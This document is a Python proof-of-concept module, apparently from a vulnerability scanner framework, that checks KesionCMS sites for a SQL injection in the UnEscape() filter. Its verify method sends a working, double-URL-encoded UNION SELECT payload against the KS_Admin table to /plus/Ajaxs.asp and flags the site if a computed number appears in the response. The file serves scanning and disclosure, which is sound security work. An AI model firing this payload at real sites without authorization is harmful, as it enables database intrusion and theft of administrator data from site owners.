# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'KesionCMS_0006'  # 平台漏洞编号，留空
    name = 'KesionCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-24'  # 漏洞公布时间
    desc = '''
        KesionCMS 方法为UnEscape()函数过滤混乱导致注入。
    '''  # 漏洞描述
    ref = 'http://www.phpfensi.com/cms/20150324/8831.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KesionCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b9bfe2b5-10c9-483e-be4d-1af2fae56cd4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/plus/Ajaxs.asp?action=GetRelativeItem&Key=goingta%2525%2527%2529%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%25201,2,6666123%252b777700%252b9%20from%20KS_Admin%2500"
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200 and "7443832" in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
